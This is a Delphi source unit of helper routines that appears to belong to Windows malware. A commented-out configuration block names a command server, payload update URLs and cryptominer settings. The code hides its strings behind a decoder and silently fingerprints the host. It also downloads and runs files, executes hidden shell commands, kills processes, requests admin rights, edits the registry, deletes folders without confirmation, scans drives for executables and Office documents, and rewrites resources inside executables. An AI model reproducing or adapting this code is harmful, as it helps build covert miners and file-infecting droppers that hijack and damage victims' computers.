unit uFnc;

interface

uses
  Windows, SysUtils, Classes, StrUtils, WinSvc, ShlObj, ShellApi, TlHelp32, ActiveX, WinInet, Winsock, NB30, Forms, StdCtrls,
  uTypes, uWin, uEnc, uEof;

procedure AddLog(Storage: TMemo; Log: string);
procedure DebCon(Data: TCnfg; Storage: TMemo); // Debug Config
function GtLocIP: Tstrings; // Local IP
function GtRanStr(StrLen: Integer): string; // Random String
function GtCoNa: string; // PC Local Name
function GtPUsNa: string; // PC Username
function GtOVer: string; // OS Version
function GtMcAdr: string; // Mac Address
function GtSpFo(FolderID: Integer): string; // Special Folder
function GtFiSi(FileName: string): int64; // File Size
function RnAA(hwnd: HWND; FileName, Param: string; Admin, Wait: Boolean; Show: Integer = 1): Integer; // RunAsAdmin
function GtTeD: string; // Temp Directory
function GtWDr: string; // Windows Directory
function GtSm32D: string; // System32 Directory
procedure CyFiRstPer(Source, Dest: string; SetAttr: Integer); // Copy Reset File Permission
function isGraAd(Host: string = ''): Boolean; // is Granted Admin
function MtxEx(Name: string): boolean; // Mutex Exist
function KlPrc(ProcName: string): Boolean; // Kill Process
function GtApPa: string; // Get Application Params
function GtReTe(ResName: string): string; // Get Resource Text
function LoFiReTe(FileName, ResName: string; Enc: Boolean = False): string; // Load File Resource Text
function UpERes(FromFile, SetData, ResName: string): Boolean; // Update Exe Resource
function ChERes(FileName, ResName: string): Boolean; // CheckExeResource
function iOObj(const ClassName: string): Boolean; // isOleObject
function iInCon: Boolean; // isInternetConnected
function DowFi(const fURL, FileName: string): boolean; // DownloadFile
function GtInDa(const aUrl: string): string; // GetInetData
function SrPar(S: string; Delimiter: Char; Return: Integer): string; // StrParse
procedure RsSaToFi(ResName, FileName: string; Enc: Boolean = False); // ResourceSaveToFile
function GtDoOu(var Output: string; CommandLine: string; Work: string = 'C:\'; Wait: DWORD = DWORD($FFFFFFFF)): Boolean; // GetDosOutput
function StKy(Key: HKEY; SubKey, Name, Value: string): Boolean; // SetKey
function GtKy(Key: HKEY; SubKey, Number: string): string; // GetKey
function DlKy(RootKey: HKEY; SubKey, Name: string): boolean; // DelKey
function BlToSt(Bl: Boolean): string; // BoolToString
procedure DrLi(DList: TStringList; DriveT: Integer); // DriveList
function DlDr(dir: string): Boolean; // DelDir
function I6Bt: Boolean; // Is64Bit
function FiVr(sFileName: string): Integer; // FileVersion
function ScPa(Path: string; MatchExtension: string = ''): TStringList; // ScanPath
function AddSlash(S: string): string;
function IsStrANumber(pcString: PChar): Boolean;
function IsDirectoryWritable(const Dir: string): Boolean;
function GetLongPathName(ShortPathName: PChar; LongPathName: PChar; cchBuffer: Integer): Integer; stdcall; external kernel32 name 'GetLongPathNameA';
procedure Delay(Milliseconds: Integer);

implementation

uses ComObj;

var
  Proc: PROCESSENTRY32;
  hSnap: HWND;
  Looper: BOOL;
  TmpProcess: TStringList;

procedure AddLog(Storage: TMemo; Log: string);
begin
  Storage.Lines.Add(Log);
end; { AddLog -> Günlüðe Ekleme Yapar }

procedure DebCon(Data: TCnfg; Storage: TMemo);
begin
  with Data do
  begin
//    AddLog(Storage, 'TcpIP            => ' + TpP);
//    AddLog(Storage, 'TcpPort          => ' + IntToStr(TpPo));
//    AddLog(Storage, 'TcpTimer         => ' + FloatToStr(TpTmr / (1000 * 60)) + ' min');
//    AddLog(Storage, 'IniUrl           => ' + InUr);
//    AddLog(Storage, 'ExeUrl           => ' + ExUr);
//    AddLog(Storage, 'UpdateTimer      => ' + FloatToStr(UpTr / (1000 * 60)) + ' min');
//    AddLog(Storage, 'RunDir           => ' + RnDi);
//    AddLog(Storage, 'RunFileName      => ' + RnFiN);
//    AddLog(Storage, 'RunFileMutex     => ' + RnMtx);
//    AddLog(Storage, 'isAdmin          => ' + BoolToStr(iAd));
//    AddLog(Storage, 'isExcel          => ' + BoolToStr(iEx));
//    AddLog(Storage, 'isWord           => ' + BoolToStr(iWo));
//    AddLog(Storage, 'Version          => ' + IntToStr(Vsr));
//    AddLog(Storage, 'OS               => ' + SO);
//    AddLog(Storage, 'Exe Res Name     => ' + EeRs);
//    AddLog(Storage, 'Exe Ver Res Name => ' + EeVRs);
//    AddLog(Storage, 'Excel Res Name   => ' + ExRsNa);
//    AddLog(Storage, 'Word Res Name    => ' + WoRsNa);
//    AddLog(Storage, 'Mining Enable    => ' + BoolToStr(Mng.Eal));
//    AddLog(Storage, 'Mining URL       => ' + Mng.RgUl);
//    AddLog(Storage, 'Mining RunDir    => ' + Mng.RnDr);
//    AddLog(Storage, 'Mining RunParam  => ' + Mng.RnPm);
//    AddLog(Storage, 'Mining RunParamL => ' + Mng.RnPmL);
//    AddLog(Storage, 'Mining E32Name   => ' + Mng.E3Nm);
//    AddLog(Storage, 'Mining E64Name   => ' + Mng.E6Nm);
//    AddLog(Storage, 'Mining Run Timer => ' + FloatToStr(Mng.RnTmr / (1000 * 60)) + ' min');
  end;
end; { DebugConfig -> Sistem Ayarlarýný Gösterir }

function GtLocIP: Tstrings;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  Buffer: PAnsiChar;
  I: Integer;
  GInitData: TWSAData;
begin
  Buffer := AllocMem(MAX_PATH);
  WSAStartup($101, GInitData);
  Result := TstringList.Create;
  Result.Clear;
  GetHostName(Buffer, Length(Buffer));
  phe := GetHostByName(Buffer);
  if phe = nil then
    Exit;
  pptr := PaPInAddr(phe^.h_addr_list);
  I := 0;
  while pptr^[I] <> nil do
  begin
    Result.Add(inet_ntoa(pptr^[I]^));
    Inc(I);
  end;
  WSACleanup;
end; { * GetLocalIP -> Local IP Adresini Döndürür * }

function GtRanStr(StrLen: Integer): string;
var
  str: string;
begin
  Randomize;
  str := DE('o1LlnQaB+gCFZOcLKS/lvOinW+uSz90CdIkWErYyEiOZPOJlx9FxNpo0dajhxpt0xrqKhKUf6nyK4jA57B');
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = StrLen)
end; {* GetRandomString -> Karýþýk String Verir *}

function GtCoNa: string;
var
  buffer: array[0..255] of char;
  size: DWORD;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end; {* GetCompName -> Bilgisayar Adýný Verir *}

function GtPUsNa: string;
var
  UserName: string;
  UserNameLen: DWORD;
begin
  UserNameLen := 255;
  SetLength(UserName, UserNameLen);
  if GetUserName(PChar(UserName), UserNameLen) then
    Result := Copy(UserName, 1, UserNameLen - 1)
  else
    Result := 'Unknown';
end; {* GetPCUserName -> Sistemin Kullanýcý Adýný Verir *}

function GtOVer: string;
begin
  Result := 'Unknown (Windows ' + IntToStr(Win32MajorVersion) + '.' + IntToStr(Win32MinorVersion) + ')';
  case Win32MajorVersion of
    4:
      case Win32MinorVersion of
        0: Result := '95';
        10: Result := '98';
        90: Result := 'ME';
      end;
    5:
      case Win32MinorVersion of
        0: Result := '2000';
        1: Result := 'XP';
        2: Result := 'XP';
      end;
    6:
      case Win32MinorVersion of
        0: Result := 'Vista';
        1: Result := '7';
        2: Result := '8';
        3: Result := '8.1/10';
      end;
    10:
      case Win32MinorVersion of
        0: Result := '10';
        1: Result := '10';
      end;
  end;
end; {* GetOsVersion -> Ýþletim Sistemi Versiyonunu Verir *}

function GtMcAdr: string;
var
  NCB: PNCB;
  Adapter: PAdapterStatus;

  URetCode: PChar;
  RetCode: char;
  I: integer;
  Lenum: PlanaEnum;
  _SystemID: string;
  TMPSTR: string;
begin
  Result := '';
  _SystemID := '';
  Getmem(NCB, SizeOf(TNCB));
  Fillchar(NCB^, SizeOf(TNCB), 0);

  Getmem(Lenum, SizeOf(TLanaEnum));
  Fillchar(Lenum^, SizeOf(TLanaEnum), 0);

  Getmem(Adapter, SizeOf(TAdapterStatus));
  Fillchar(Adapter^, SizeOf(TAdapterStatus), 0);

  Lenum.Length := chr(0);
  NCB.ncb_command := chr(NCBENUM);
  NCB.ncb_buffer := Pointer(Lenum);
  NCB.ncb_length := SizeOf(Lenum);
  RetCode := Netbios(NCB);

  i := 0;
  repeat
    Fillchar(NCB^, SizeOf(TNCB), 0);
    Ncb.ncb_command := chr(NCBRESET);
    Ncb.ncb_lana_num := lenum.lana[I];
    RetCode := Netbios(Ncb);

    Fillchar(NCB^, SizeOf(TNCB), 0);
    Ncb.ncb_command := chr(NCBASTAT);
    Ncb.ncb_lana_num := lenum.lana[I];
    // Must be 16
    Ncb.ncb_callname := '*               ';

    Ncb.ncb_buffer := Pointer(Adapter);

    Ncb.ncb_length := SizeOf(TAdapterStatus);
    RetCode := Netbios(Ncb);
    if (RetCode = chr(0)) or (RetCode = chr(6)) then
    begin
      _SystemId := IntToHex(Ord(Adapter.adapter_address[0]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[1]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[2]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[3]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[4]), 2) + '-' +
        IntToHex(Ord(Adapter.adapter_address[5]), 2);
    end;
    Inc(i);
  until (I >= Ord(Lenum.Length)) or (_SystemID <> '00-00-00-00-00-00');
  FreeMem(NCB);
  FreeMem(Adapter);
  FreeMem(Lenum);
  GtMcAdr := _SystemID;
end; { GetMACAdress -> Bilgisayarýn MAC Adresini Döndürür }

type
  KNOWNFOLDERID = TGuid;
  TSHGetKnownFolderPath = function(const rfid: KNOWNFOLDERID; dwFlags: DWORD; hToken: THandle; out ppszPath: PWideChar): HResult; stdcall;

function GtSpFo(FolderID: Integer): string;
const
  CSIDL_APPDATA = $001A; // User/APPData/Roaming
  CSIDL_LOCAL_APPDATA = $001C; // User/APPData/Local
  CSIDL_COMMON_APPDATA = $0023; // ProgramData
  CSIDL_COMMON_DOCUMENTS = $002E; // Public Documents
  CSIDL_PERSONAL = $0005; // User Document
  CSIDL_DESKTOP = $0000;
var
  vSFolder: pItemIDList;
  vSpecialPath: array[0..MAX_PATH] of Char;
  ASpecialFolderID: Integer;
  GStr: PWideChar;
  TSH: TSHGetKnownFolderPath;
  DLLH: Cardinal;
begin
  case FolderID of
    1: ASpecialFolderID := CSIDL_APPDATA;
    2: ASpecialFolderID := CSIDL_LOCAL_APPDATA;
    3: ASpecialFolderID := CSIDL_COMMON_APPDATA;
    4: ASpecialFolderID := CSIDL_COMMON_DOCUMENTS;
    5: ASpecialFolderID := CSIDL_PERSONAL;
    6: ASpecialFolderID := CSIDL_DESKTOP;
  end;
  if (FolderID = 7) then
  begin
    try
      if GtOVer <> 'XP' then begin
        DLLH := LoadLibrary(PChar(DE('6twLWD8fCzFZMgO')));
        @TSH := GetProcAddress(DLLH, PChar(DE('a1NFtZdy4e6zpA2yucjHw20SWFD')));
        TSH(StringToGUID('{374DE290-123F-4565-9164-39C4925E467B}'), 0, 0, GStr);
        Result := GStr;
      end else
      begin
        SHGetSpecialFolderLocation(0, CSIDL_PERSONAL, vSFolder);
        SHGetPathFromIDList(vSFolder, vSpecialPath);
        Result := ExtractFileDir(StrPas(vSpecialPath));
        if DirectoryExists(Result + '\Downloads') then
          Result := Result + '\Downloads'
        else if DirectoryExists(Result + '\Karþýdan Yüklenenler') then
          Result := Result + '\Karþýdan Yüklenenler'
        else Result := '';
      end;
    except
    end;
  end else
  begin
    SHGetSpecialFolderLocation(0, ASpecialFolderID, vSFolder);
    SHGetPathFromIDList(vSFolder, vSpecialPath);
    Result := StrPas(vSpecialPath);
  end;
end; {* GetSpecialFolder -> Ýþletim Sistemi Özel Klasörlerinin Yolunu Verir *}

function GtFiSi(FileName: string): int64;
var
  fh: integer;
  fi: TByHandleFileInformation;
begin
  result := 0;
  fh := fileopen(FileName, fmOpenRead);
  try
    if GetFileInformationByHandle(fh, fi) then
    begin
      result := fi.nFileSizeHigh;
      result := result shr 32 + fi.nFileSizeLow;
    end;
  finally
    fileclose(fh);
  end;
end; {* GetFileSize -> Dosya boyutunu bayt olarak hesaplar *}

function RnAA(hwnd: HWND; FileName, Param: string; Admin, Wait: Boolean; Show: Integer = 1): Integer;
var
  sei: TShellExecuteInfo;
begin
  Result := 0;

  ZeroMemory(@sei, SizeOf(sei));
  FillChar(sei, SizeOf(sei), 0);
  sei.cbSize := SizeOf(TShellExecuteInfo);
  sei.Wnd := hwnd;
  sei.nShow := Show;
  sei.fMask := SEE_MASK_NOCLOSEPROCESS or SEE_MASK_FLAG_NO_UI;
  sei.lpFile := PChar(FileName);
  sei.hInstApp := hwnd;

  if Admin then sei.lpVerb := PChar(DE('7RUtE4F'));
  if Param <> '' then sei.lpParameters := PChar(Param);

  if ShellExecuteEx(@sei) then
  begin
    if Wait and (sei.hProcess <> 0) then
      while WaitForSingleObject(sei.hProcess, 50) = WAIT_TIMEOUT do Sleep(10);

    Result := sei.hProcess;
  end;
end; {* RunAsAdmin -> Uygulamayý Yönetici Olarak Çalýþtýrýr *}

function GtTeD: string;
var
  tempFolder: array[0..MAX_PATH] of Char;
  PathTmp: string;
begin
  GetTempPath(MAX_PATH, @tempFolder);
  PathTmp := StrPas(tempFolder);
  SetLength(PathTmp, GetLongPathName(PChar(PathTmp), PChar(PathTmp), MAX_PATH));
  Result := PathTmp;
end; {* GetTempDir -> Temp Dizinini Verir *}

function GtWDr: string;
var
  Dir: array[0..max_path] of char;
begin
  GetWindowsDirectory(Dir, max_path);
  Result := StrPas(dir);
end; {* GetWinDir -> Windows Dizin Yolunu Verir *}

function GtSm32D: string;
var
  Dir: array[0..max_path] of char;
begin
  GetSystemDirectory(Dir, max_path);
  Result := StrPas(dir);
end; {* GetSystem32Dir -> System32 Klasör Yolunu Verir *}

procedure CyFiRstPer(Source, Dest: string; SetAttr: Integer);
begin
  if FileExists(Dest) then
    FileSetAttr(PChar(Dest), 128);
  CopyFile(PChar(Source), PChar(Dest), FALSE);
  FileSetAttr(PChar(Dest), SetAttr);
end; {* CopyFileResetPermission -> Dosya Ýzinlerini Sýfýrlayarak Kopyalama Yapar *}

function isGraAd(Host: string = ''): Boolean;
var
  H: SC_HANDLE;
begin
  if Win32Platform <> VER_PLATFORM_WIN32_NT then
    Result := True
  else
  begin
    H := OpenSCManager(PChar(Host), nil, SC_MANAGER_ALL_ACCESS);
    Result := H <> 0;
    if Result then
      CloseServiceHandle(H);
  end;
end; {* isGrantedAdmin -> Uygulamanýn Admini Eriþimi Olup Olmadýðýný Denetler *}

function MtxEx(Name: string): Boolean;
var
  Handle: THandle;
begin
  Handle := OpenMutex(MUTEX_ALL_ACCESS, false, PChar(Name));

  if Handle <> 0 then
    Result := True
  else
    Result := False;

  CloseHandle(Handle);
end; {* MutexExist -> Aktif Mutex Olup Olmadýðýný Sorgular *}

function KlPrc(ProcName: string): Boolean;
begin
  Result := False;
  if ProcName <> '' then begin
    proc.dwSize := SizeOf(Proc);
    hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    Looper := Process32First(hSnap, proc);
    while Integer(Looper) <> 0 do
    begin
      if ExtractFileName(Proc.szExeFile) = ProcName then
        if TerminateProcess(OpenProcess(PROCESS_TERMINATE, Bool(1), proc.th32ProcessID), 0)
          then
          Result := True
        else
          Result := False;
      Looper := Process32Next(hSnap, proc);
    end;
    CloseHandle(hSnap);
  end;
end; {* KillProcess -> Aktif Ýþlemi Sonlandýrýr *}

function GtApPa: string;
var
  i: Integer;
begin
  for i := 1 to ParamCount do
  begin
    Result := Result + ' ' + ParamStr(i);
  end;
end; {* GetAppParams -> Uygulamaya Gönderilen Parametlerini Döndürür *}

function GtReTe(ResName: string): string;
var
  RS: TResourceStream;
begin
  if FindResource(HInstance, PChar(ResName), RT_RCDATA) <> 0 then
  begin
    RS := TResourceStream.Create(HInstance, ResName, RT_RCDATA);
    SetLength(Result, RS.Size);
    RS.ReadBuffer(Result[1], RS.Size);
  end
  else
    Result := '0';
end; {* GetResourceText -> Resleri String Olarak Döndürür *}

function LoFiReTe(FileName, ResName: string; Enc: Boolean = False): string;
var
  RS: TResourceStream;
  FHandle: HMODULE;
begin
  Result := '0';
  try
    FHandle := LoadLibrary(PChar(FileName));
    if FindResource(FHandle, PChar(ResName), RT_RCDATA) = 0 then
      Result := '0'
    else begin
      RS := TResourceStream.Create(FHandle, ResName, RT_RCDATA);
      SetLength(Result, RS.Size);
      RS.ReadBuffer(Result[1], RS.Size);
      if Enc then
        Result := DE(Result);
    end;

    RS.Free;
    FreeLibrary(FHandle);
  except on E: EResNotFound do
      Result := '0';
  end;
end; {* GetResourceText -> Resleri String Olarak Döndürür *}

function GetFileInfo(FName, InfoType: string): string;
const
  VersionInfo: array[1..8] of string = (
    'CompanyName', 'FileDescription', 'FileVersion', 'InternalName',
    'LegalCopyRight', 'OriginalFileName', 'ProductName', 'ProductVersion');
var
  Info: Pointer;
  InfoData: Pointer;
  InfoSize: LongInt;
  InfoLen: {$IFDEF WIN32}DWORD; {$ELSE}LongInt; {$ENDIF}
  DataLen: {$IFDEF WIN32}UInt; {$ELSE}word; {$ENDIF}
  LangPtr: Pointer;
begin
  result := '';
  DataLen := 255;
  InfoSize := GetFileVersionInfoSize(@Fname[1], InfoLen);
  if (InfoSize <> 0) then
  begin
    GetMem(Info, InfoSize);
    try
      if GetFileVersionInfo(@FName[1], InfoLen, InfoSize, Info) then
      begin
        if VerQueryValue(Info, '\VarFileInfo\Translation', LangPtr, DataLen) then
          InfoType := Format('\StringFileInfo\%0.4x%0.4x\%s'#0,
            [LoWord(LongInt(LangPtr^)),
            HiWord(LongInt(LangPtr^)), InfoType]);
        if VerQueryValue(Info, @InfoType[1], InfoData, Datalen) then
          Result := strPas(InfoData);
      end;
    finally
      FreeMem(Info, InfoSize);
    end;
  end;
end; {* GetFileInfo -> Dosya Üst Bilgilerini Döndürür *}

function UpERes(FromFile, SetData, ResName: string): Boolean;
var
  RHandle: THandle;
  DLength: DWord;
  Data: Pointer;
  FGetAttr: Integer;
begin
  // Dosya Eriþim Ýzni Ver
  FGetAttr := FileGetAttr(FromFile);
  FileSetAttr(FromFile, 128);

  RHandle := BeginUpdateResource(PChar(FromFile), False);
  Result := RHandle <> 0;

  if Result then
  begin
    try
      DLength := 0;
      GetMem(Data, 0);
      Result := UpdateResource(RHandle, RT_RCDATA, PChar(ResName), LANG_NEUTRAL, Data, DLength);
      Result := EndUpdateResource(RHandle, False) and Result;
    finally
      FreeMem(Data);
    end;
  end;

  // Dosya Ýzinlerini Sýfýrla
  FileSetAttr(FromFile, FGetAttr);
end; {* UpdateExeResource -> Exe Reslerini Data ile Deðiþtirir *}


function ChERes(FileName, ResName: string): Boolean;
var
  HResInfo: HRSRC;
  FHandle: HMODULE;
begin
  Result := False;
  try
    FHandle := LoadLibrary(PChar(FileName));
    HResInfo := FindResource(FHandle, PChar(ResName), RT_RCDATA);
    if HResInfo = 0 then
      Result := False
    else
      Result := True;

    FreeResource(HResInfo);
    FreeLibrary(FHandle);
  except on E: EResNotFound do
      Result := False;
  end;
end; {* CheckExeResource -> Exe Resource Kontrolü Yapar *}

function iOObj(const ClassName: string): Boolean;
var
  ClassID: TCLSID;
begin
  Result := Succeeded(CLSIDFromProgID(PWideChar(WideString(ClassName)),
    ClassID));
end; { isOleObject -> Activex Kontrolü Yapar }

function iInCon: Boolean;
var
  Flags: DWORD;
begin
  Flags := 0;
  Result := WinInet.InternetGetConnectedState(@Flags, 0);
end; { isInternetConnected -> Internet Baðlantýsý Olup Olmadýðýný Verir }

function DowFi(const fURL, FileName: string): boolean;
const
  BufferSize = 1024;
var
  hSession, hURL: HInternet;
  Buffer: array[1..BufferSize] of Byte;
  BufferLen: DWORD;
  f: file;
  sAppName: string;
  TextF: TStringList;
  ff: TextFile;
  Ch, St: string;
  fileURL: string;
  err: Cardinal;
begin
  result := false;
  fileURL := IfThen(Pos(fURL, 'http') > 0, fURL, 'http://' + fURL);
  sAppName := ExtractFileName(ParamStr(0));
  hSession := IOA(PChar(sAppName), INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
  try
    hURL := IOU(hSession, PChar(fileURL), nil, 0, INTERNET_FLAG_RELOAD or INTERNET_FLAG_DONT_CACHE, 0);
    err := GetLastError;
    if (err >= 12001) and (err <= 12156) then Exit;
    try
      AssignFile(f, FileName);
      Rewrite(f, 1);
      repeat
        IRF(hURL, @Buffer, SizeOf(Buffer), BufferLen);
        BlockWrite(f, Buffer, BufferLen)
      until BufferLen = 0;
      CloseFile(f);
      Result := True;
    finally
      ICH(hURL)
    end
  finally
    ICH(hSession)
  end;

  AssignFile(ff, FileName);
  FileMode := fmOpenRead;
  Reset(ff);

  while not Eof(ff) do
  begin
    Readln(ff, Ch);
    St := St + Ch
  end;

  CloseFile(ff);

  if Pos('Error 404', St) <> 0 then Result := False
  else if Pos('Error', St) <> 0 then Result := False
  else if Pos('Not Found', St) <> 0 then Result := False;
end; { DownloadFile -> Internetten Dosya indirir }


function GtInDa(const aUrl: string): string;
var
  hSession: HINTERNET;
  hService: HINTERNET;
  lpBuffer: array[0..1024 + 1] of Char;
  dwBytesRead: DWORD;
begin
  Result := '';
  hSession := InternetOpen('MyApp', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
  try
    if Assigned(hSession) then
    begin
      hService := InternetOpenUrl(hSession, PChar(aUrl), nil, 0, INTERNET_FLAG_RELOAD or INTERNET_FLAG_DONT_CACHE, 0);
      if Assigned(hService) then
      try
        while True do
        begin
          dwBytesRead := 1024;
          InternetReadFile(hService, @lpBuffer, 1024, dwBytesRead);
          if dwBytesRead = 0 then break;
          lpBuffer[dwBytesRead] := #0;
          Result := Result + lpBuffer;
        end;
      finally
        InternetCloseHandle(hService);
      end;
    end;
  finally
    InternetCloseHandle(hSession);
  end;
end; { GetInetData -> Internetten String olarak veri okur }

function SrPar(S: string; Delimiter: Char; Return: Integer): string;
var
  ST: TStringList;
begin
  ST := TStringList.Create;
  ST.Delimiter := Delimiter;
  ST.DelimitedText := S;

  Result := ST[Return];
end;

procedure RsSaToFi(ResName, FileName: string; Enc: Boolean = False);
var
  RS: TResourceStream;
  MS: TMemoryStream;
  FS: TFileStream;
  Context: AnsiString;
begin
  RS := TResourceStream.Create(HInstance, ResName, RT_RCDATA);
  MS := TMemoryStream.Create;
  FS := TFileStream.Create(FileName, fmCreate or fmOpenWrite and fmShareDenyWrite);
  MS.LoadFromStream(RS);
  SetLength(Context, MS.Size);
  MS.ReadBuffer(Context[1], MS.Size);
  MS.Free;

  if Enc then
    Context := DE(Context);

  FS.WriteBuffer(Context[1], Length(Context));
  FS.Free;
end; { ResourceSaveToFile -> Res'i Dosya olarak Kaydeder}

function GtDoOu(var Output: string; CommandLine: string; Work: string = 'C:\'; Wait: DWORD = DWORD($FFFFFFFF)): Boolean;
var
  SA: TSecurityAttributes;
  SI: TStartupInfo;
  PI: TProcessInformation;
  StdOutPipeRead, StdOutPipeWrite: THandle;
  StdErrorOutPipeRead, StdErrorOutPipeWrite: THandle;
  WasOK: Boolean;
  Buffer: array[0..255] of AnsiChar;
  BytesRead: Cardinal;
  WorkDir: string;
  Handle: Boolean;
begin
  Result := False;

  with SA do
  begin
    nLength := SizeOf(SA);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(StdOutPipeRead, StdOutPipeWrite, @SA, 0);
  CreatePipe(StdErrorOutPipeRead, StdErrorOutPipeWrite, @SA, 0);

  try
    with SI do
    begin
      FillChar(SI, SizeOf(SI), 0);
      cb := SizeOf(SI);
      dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
      wShowWindow := SW_HIDE;
      hStdInput := GetStdHandle(STD_INPUT_HANDLE);
      hStdOutput := StdOutPipeWrite;
      hStdError := StdErrorOutPipeWrite;
    end;

    if DirectoryExists(Work) then
      WorkDir := Work
    else
      WorkDir := 'C:\';

    Handle := CreateProcess(nil, PChar(DE('qFhH2HdxeGADMYL') + CommandLine), nil, nil, True, 0, nil, PChar(WorkDir), SI, PI);
    CloseHandle(StdOutPipeWrite);
    CloseHandle(StdErrorOutPipeWrite);

    if Handle then
    try
      if Wait <> 1 then begin
        // Success
        repeat
          WasOK := ReadFile(StdOutPipeRead, Buffer, 255, BytesRead, nil);
          if BytesRead > 0 then
          begin
            Buffer[BytesRead] := #0;
            OemToAnsi(Buffer, Buffer);
            Output := Output + Buffer;
            Result := True;
          end;
        until not WasOK or (BytesRead = 0);

        // Error
        repeat
          WasOK := ReadFile(StdErrorOutPipeRead, Buffer, 255, BytesRead, nil);
          if BytesRead > 0 then
          begin
            Buffer[BytesRead] := #0;
            OemToAnsi(Buffer, Buffer);
            Output := Output + Buffer;
            Result := False;
          end;
        until not WasOK or (BytesRead = 0);
      end;
      WaitForSingleObject(PI.hProcess, wait);

    finally
      CloseHandle(PI.hThread);
      CloseHandle(PI.hProcess);
    end;

  finally
    CloseHandle(StdOutPipeRead);
    CloseHandle(StdErrorOutPipeRead);
  end;
end; (* GetDosOutput -> CMD Ekran Çýktýsýný Verir *)

function StKy(Key: HKEY; SubKey, Name, Value: string): Boolean;
var
  RegKey: HKEY;
begin
  Result := False;
  RegCreateKey(Key, PChar(SubKey), RegKey);
  if RegSetValueEx(RegKey, PChar(Name), 0, REG_SZ, PChar(Value), Length(Value)) = 0 then
    Result := True;
  RegCloseKey(RegKey);
end; { SetKey -> Registry Add Key }

function GtKy(Key: HKEY; Subkey, Number: string): string;
var
  BytesRead: DWORD;
  RegKey: HKEY;
  Value: string;
begin
  Result := '';
  RegOpenKeyEx(Key, PChar(SubKey), 0, KEY_READ or $0100, RegKey);
  RegQueryValueEx(RegKey, PChar(Number), nil, nil, nil, @BytesRead);
  SetLength(Value, BytesRead);
  if RegQueryValueEx(RegKey, PChar(Number), nil, nil, @Value[1], @BytesRead) = 0 then
    Result := Value;
  RegCloseKey(RegKey);
end; { Getkey -> Registry Get Key }

function DlKy(RootKey: HKEY; SubKey, Name: string): Boolean;
var
  hTemp: HKEY;
begin
  Result := False;
  if RegOpenKeyEx(RootKey, PChar(SubKey), 0, KEY_WRITE or $0100, hTemp) = ERROR_SUCCESS then
  begin
    Result := (RegDeleteValue(hTemp, PChar(Name)) = ERROR_SUCCESS);
    RegCloseKey(hTemp);
  end;
end; { Dekey -> Registry Delete Key }

function ScPa(Path: string; MatchExtension: string = ''): TStringList;
var
  Files: TStringList;
  procedure ScanDirectory(Path: string);
  var
    FD: _WIN32_FIND_DATA;
    hSearch: DWORD;
    nPath: string;
    Dirs: TStringList;
    i: Integer;
  begin
    if MatchExtension = '' then MatchExtension := DE('1VXpYjXX65Rhsef1SA53On1UiF1TXv3YscUS'); // |.exe|.xls|.xlsx|.doc|.docx
    Dirs := TStringList.Create;
    hSearch := FindFirstFile(PChar(Path + '*.*'), fd);
    if hSearch <> INVALID_HANDLE_VALUE then begin
      repeat
        if (FD.cFileName[0] <> '.') and (FD.cFileName <> '..') then
          if (FD.dwFileAttributes = FILE_ATTRIBUTE_DIRECTORY) then
            Dirs.Add(IncludeTrailingPathDelimiter(Path + FD.cFileName))
          else
            if DirectoryExists(Path + FD.cFileName) then
              Dirs.Add(IncludeTrailingPathDelimiter(Path + FD.cFileName))
            else if Pos(ExtractFileExt(Path + FD.cFileName), MatchExtension) > 0 then
              Files.Add(Path + FD.cFileName);

        Application.ProcessMessages;
      until FindNextFile(hSearch, FD) = false;

      if Dirs.Count > 0 then
        for i := 0 to Dirs.Count - 1 do begin
          ScanDirectory(Dirs.Strings[i]);
        end;

      Windows.FindClose(hSearch);
    end;
  end;
begin
  Files := TStringList.Create;
  ScanDirectory(IncludeTrailingPathDelimiter(Path));
  Result := Files;
end; { ScanPath -> Search Dir File List }

function BlToSt(Bl: Boolean): string;
begin
  if Bl then
    Result := 'True'
  else
    Result := 'False';
end; { BoolToString -> Bool to True or False }

procedure DrLi(DList: TStringList; DriveT: Integer);
var
  LogicalDrives: DWORD;
  Drive: Char;
  Root, DriveType, SerialNumber: string;
  VolumeNameBuffer: array[0..MAX_PATH] of Char;
  VolumeSerialNumber: DWORD;
  MaximumComponentLength: DWORD;
  FileSystemFlags: DWORD;
  FileSystemNameBuffer: array[0..MAX_PATH] of Char;
begin
  LogicalDrives := GetLogicalDrives;
  for Drive := 'A' to 'Z' do
    if LogicalDrives and (1 shl (Ord(Drive) - Ord('A'))) <> 0 then begin
      if DriveT = -1 then begin
        Root := Drive + ':\';
        case GDT(PChar(Root)) of
          1: DriveType := DE('ABPgIMINSxEFNOfYBbwrsaK');
          2: DriveType := DE('bFg6OxH8AFAh');
          3: DriveType := DE('P59BuPP');
          4: DriveType := DE('bFg6O53SqZRbektIswJ7fD');
          5: DriveType := DE('Kt+23R1G');
          6: DriveType := DE('bViw3qXxGkB');
        else
          DriveType := 'Unknown';
        end;
        DList.Add(Root);
        DList.Add(DriveType);
      end else if GDT(PChar(Drive + ':\')) = DriveT then
      begin
        Root := Drive + ':\';
        case GDT(PChar(Root)) of
          1: DriveType := DE('ABPgIMINSxEFNOfYBbwrsaK');
          2: DriveType := DE('bFg6OxH8AFAh');
          3: DriveType := DE('P59BuPP');
          4: DriveType := DE('bFg6O53SqZRbektIswJ7fD');
          5: DriveType := DE('Kt+23R1G');
          6: DriveType := DE('bViw3qXxGkB');
        else
          DriveType := 'Unknown';
        end;
        //DList.Add(DriveType);
        DList.Add(Root);
      end;
    end;
end; {* DriveList -> Sürücü Listesini Verir *}

function DlDr(dir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT or FOF_NOCONFIRMATION;
    pFrom := PChar(dir + #0);
  end;
  Result := (0 = ShFileOperation(fos));
end; { DelDir -> Dizin Siler }
